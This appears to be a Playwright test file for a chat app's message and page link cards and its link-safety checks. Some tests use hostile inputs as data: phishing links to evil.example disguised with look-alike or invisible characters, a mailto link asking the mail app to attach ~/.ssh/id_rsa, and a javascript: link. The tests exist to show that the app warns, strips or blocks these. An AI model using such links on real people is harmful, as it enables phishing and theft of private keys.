import { expect, type Page, test } from "@playwright/test";
import { allowClipboard, openedLinks, recordOpenedLinks } from "./support";

declare global {
  interface Window {
    linkedMessageLoads: number;
  }
}

test.beforeEach(async ({ page, context, browserName }) => {
  await allowClipboard(context, browserName);
  await page.goto("");
  await page.getByRole("button", { name: "general", exact: true }).click();
});

/**
 * Copies with `copy` and returns the text once it's on the clipboard: the app
 * writes it asynchronously, after the click. The text must differ from what
 * the clipboard held before.
 */
async function copied(page: Page, copy: () => Promise<void>): Promise<string> {
  const readClipboard = () => page.evaluate(() => navigator.clipboard.readText());
  const before = await readClipboard();
  await copy();
  await expect.poll(readClipboard).not.toBe(before);
  return readClipboard();
}

async function copyFromMessage(page: Page, text: string, action: string) {
  return copied(page, async () => {
    await page.getByRole("article").filter({ hasText: text }).first().hover();
    await page.getByRole("button", { name: "More actions" }).click();
    await page.getByRole("menuitem", { name: action }).click();
  });
}

test("copy text gives the message's raw markdown", async ({ page }) => {
  const composer = page.getByLabel("Message #general");
  await composer.fill("Use **bold** and `code`");
  await composer.press("Enter");

  expect(await copyFromMessage(page, "Use bold", "Copy text")).toBe("Use **bold** and `code`");
});

test("a pasted message link shows a card that jumps to the message", async ({ page }) => {
  const composer = page.getByLabel("Message #general");
  await composer.fill("The plan is to ship on Friday");
  await composer.press("Enter");
  const link = await copyFromMessage(page, "ship on Friday", "Copy link");
  expect(link).toMatch(/^shy:\/\/61636d6500000000\/message\/[0-9a-f]+$/);

  await composer.fill(`See ${link}`);
  await composer.press("Enter");
  const card = page.getByRole("button", { name: "Message from Ada in #general" });
  await expect(card).toContainText("ship on Friday");
  await card.click();
  await expect(page.locator(`#message-${link.split("/").pop()}`)).toBeVisible();
});

test("a link to a message you can't see says why it might be hidden", async ({ page }) => {
  await page.getByLabel("Message #general").fill("For the launch team: shy://message/0123456789abcdef");
  await page.getByLabel("Message #general").press("Enter");

  const message = page.getByRole("article").filter({ hasText: "For the launch team" });
  await expect(message.getByRole("note")).toHaveText(
    "A message you can't seeIt may be in a private channel you're not in, or deleted.",
  );
  await expect(message.getByRole("button", { name: /Message from/ })).toHaveCount(0);
});

test("a message with many message links shows three as cards and the rest as links", async ({ page }) => {
  const ids = await page.evaluate(() => {
    const grace = window.fake.addMember("Grace");
    return ["one", "two", "three", "four", "five"].map((word) => window.fake.receiveMessage(grace, "general", word));
  });
  await send(page, "general", `Read these:\n${ids.map((id) => `shy://message/${id}`).join("\n")}`);

  const message = page.getByRole("article").filter({ hasText: "Read these" });
  await expect(message.getByRole("button", { name: "Message from Grace in #general" })).toHaveCount(3);
  await expect(message.getByRole("button", { name: /Message from/ }).first()).toContainText("one");
  await expect(message.getByRole("button", { name: "a message", exact: true })).toHaveCount(2);
});

test("a message with many page links shows three as cards and the rest as links", async ({ page }) => {
  const ids = await page.evaluate(() =>
    [1, 2, 3, 4, 5].map((number) => window.fake.handle("create_page", { title: `Part ${number}`, parent: null })),
  );
  await send(page, "general", `Chapters:\n${ids.map((id) => `shy://page/${id}`).join("\n")}`);

  const message = page.getByRole("article").filter({ hasText: "Chapters" });
  await expect(message.getByRole("button", { name: /^Part \d.*Empty page$/ })).toHaveCount(3);
  await expect(message.getByRole("button", { name: "Part 4", exact: true })).toBeVisible();
  await expect(message.getByRole("button", { name: "Part 5", exact: true })).toBeVisible();
});

test("a message card reloads only for changes in its channel", async ({ page }) => {
  const { grace, linked } = await page.evaluate(() => {
    window.fake.handle("create_channel", { name: "random" });
    const grace = window.fake.addMember("Grace");
    return { grace, linked: window.fake.receiveMessage(grace, "general", "The plan is to ship on Friday") };
  });
  await send(page, "general", `See shy://message/${linked}`);
  await expect(page.getByRole("button", { name: "Message from Grace in #general" })).toContainText("ship on Friday");
  await page.evaluate(() => {
    const fake = window.fake;
    const handle = fake.handle.bind(fake);
    window.linkedMessageLoads = 0;
    fake.handle = (command, args) => {
      if (command === "linked_message") window.linkedMessageLoads += 1;
      return handle(command, args);
    };
  });

  await page.evaluate((author) => window.fake.receiveMessage(author, "random", "elsewhere"), grace);
  const sidebar = page.getByRole("navigation", { name: "Workspace" });
  await expect(sidebar.getByRole("button", { name: /^random, 1 unread/ })).toBeVisible();
  expect(await page.evaluate(() => window.linkedMessageLoads)).toBe(0);

  await page.evaluate((author) => window.fake.receiveMessage(author, "general", "here"), grace);
  await expect.poll(() => page.evaluate(() => window.linkedMessageLoads)).toBeGreaterThan(0);
});

async function send(page: Page, channel: string, text: string) {
  const composer = page.getByLabel(`Message #${channel}`);
  await composer.fill(text);
  await composer.press("Enter");
}

async function copyPageLink(page: Page, title: string) {
  await page.getByRole("button", { name: "New page" }).click();
  await page.getByLabel("Page title").fill(title);
  await page.getByLabel("Page title").press("Enter");
  const sidebar = page.getByRole("navigation", { name: "Workspace" });
  return copied(page, async () => {
    await sidebar.getByRole("button", { name: title, exact: true }).click({ button: "right" });
    await page.getByRole("menuitem", { name: "Copy link" }).click();
  });
}

test("a link on a line of its own shows only as its card", async ({ page }) => {
  const pageLink = await copyPageLink(page, "Spec");
  await page.getByRole("button", { name: "general", exact: true }).click();
  await send(page, "general", "The plan is to ship on Friday");
  const messageLink = await copyFromMessage(page, "ship on Friday", "Copy link");

  await send(page, "general", `Have a look\n${pageLink}\n${messageLink}`);
  const message = page.getByRole("article").filter({ hasText: "Have a look" });
  await expect(message.getByRole("button", { name: "Message from Ada in #general" })).toBeVisible();
  await expect(message.getByRole("button", { name: /Spec/ })).toHaveCount(1);
  await expect(message.getByText("a message", { exact: true })).toHaveCount(0);
});

test("a message link inside a sentence opens the message", async ({ page }) => {
  await send(page, "general", "The plan is to ship on Friday");
  const link = await copyFromMessage(page, "ship on Friday", "Copy link");
  await page.getByRole("button", { name: "New channel" }).click();
  await page.getByLabel("Channel name").fill("random");
  await page.getByLabel("Channel name").press("Enter");

  await send(page, "random", `As I said in ${link}, yes`);
  await page.getByRole("article").filter({ hasText: "As I said" }).getByRole("button", { name: "a message" }).click();
  await expect(page.getByLabel("Message #general")).toBeVisible();
  await expect(page.locator(`#message-${link.split("/").pop()}`)).toBeVisible();
});

test("a link shows where it goes before you open it", async ({ page }) => {
  await recordOpenedLinks(page);
  await send(page, "general", "Read [the docs](https://example.com/guide/start)");

  const link = page.getByRole("link", { name: "the docs" });
  await link.hover();
  await expect(page.getByRole("tooltip")).toContainText("https://example.com/guide/start");
  await link.click();
  await expect.poll(() => openedLinks(page)).toEqual(["https://example.com/guide/start"]);
});

test("a link whose text shows another address asks before opening", async ({ page }) => {
  await recordOpenedLinks(page);
  await send(page, "general", "Log in at [https://bank.example](https://evil.example/login)");
  const link = page.getByRole("link", { name: "https://bank.example" });

  await link.click();
  const dialog = page.getByRole("dialog", { name: "Open this link?" });
  await expect(dialog).toContainText("https://evil.example/login");
  await dialog.getByRole("button", { name: "Cancel" }).click();
  await expect(dialog).toHaveCount(0);

  await link.click();
  await page.getByRole("button", { name: "Open link" }).click();
  await expect.poll(() => openedLinks(page)).toEqual(["https://evil.example/login"]);
});

for (const [label, text] of [
  ["a name and password in the address", "[paypal.com](https://paypal.com:x@evil.example/login)"],
  ["a trailing period", "[paypal.com.](https://evil.example/login)"],
  ["a look-alike letter", "[p\u0430ypal.com](https://evil.example/login)"],
  ["an address inside a sentence", "[Log in at paypal.com](https://evil.example/login)"],
  ["a name before the host, written out", "https://accounts.google.com@evil.example/login"],
  ["an invisible character in its text", "[pay\u200Bpal.com](https://evil.example/login)"],
]) {
  test(`a misleading link with ${label} still asks first`, async ({ page }) => {
    await recordOpenedLinks(page);
    await send(page, "general", `Here: ${text}`);
    await page.getByRole("article").filter({ hasText: "Here:" }).getByRole("link").click();

    await expect(page.getByRole("dialog", { name: "Open this link?" })).toBeVisible();
    expect(await openedLinks(page)).toEqual([]);
  });
}

test("an honest link opens straight away", async ({ page }) => {
  await recordOpenedLinks(page);
  await send(page, "general", "Docs at [example.com](https://www.example.com/guide)");
  await page.getByRole("link", { name: "example.com" }).click();
  await expect.poll(() => openedLinks(page)).toEqual(["https://www.example.com/guide"]);
});

test("a mail link opens without its query, which could ask the mail app to attach files", async ({ page }) => {
  await recordOpenedLinks(page);
  await send(page, "general", "Write to [x@evil.example](mailto:x@evil.example?attach=~/.ssh/id_rsa&subject=hi)");
  await page.getByRole("link", { name: "x@evil.example" }).click();
  await expect.poll(() => openedLinks(page)).toEqual(["mailto:x@evil.example"]);
});

test("a link with an uppercase scheme still opens, with the scheme lowercased", async ({ page }) => {
  await recordOpenedLinks(page);
  await send(page, "general", "See [the guide](HTTPS://Example.com/Guide)");
  await page.getByRole("link", { name: "the guide" }).click();
  await expect.poll(() => openedLinks(page)).toEqual(["https://Example.com/Guide"]);
});

test("a long link's tooltip wraps inside the tooltip width", async ({ page }) => {
  const address = `https://example.com/${"very-long-path-segment/".repeat(12)}end`;
  await send(page, "general", `Read [the long docs](${address})`);

  await page.getByRole("link", { name: "the long docs" }).hover();
  const tooltip = page.locator("[data-radix-popper-content-wrapper] > div").filter({ hasText: address });
  await expect(tooltip).toBeVisible();
  const box = await tooltip.boundingBox();
  if (!box) throw new Error("the tooltip has no box");
  expect(box.width).toBeLessThanOrEqual(320);
  expect(box.height).toBeGreaterThan(40);
  expect(await tooltip.evaluate((element) => element.scrollWidth <= element.clientWidth)).toBe(true);
});

test("a link to a blocked address shows as its text, not a link that fails", async ({ page }) => {
  await page.evaluate(() =>
    window.fake.receiveMessage(
      window.fake.addMember("Mallory"),
      "general",
      "Try [this trick](javascript:alert(1)) now",
    ),
  );
  const message = page.getByRole("article").filter({ hasText: "this trick" });
  await expect(message).toContainText("Try this trick now");
  await expect(message.getByRole("link")).toHaveCount(0);
});
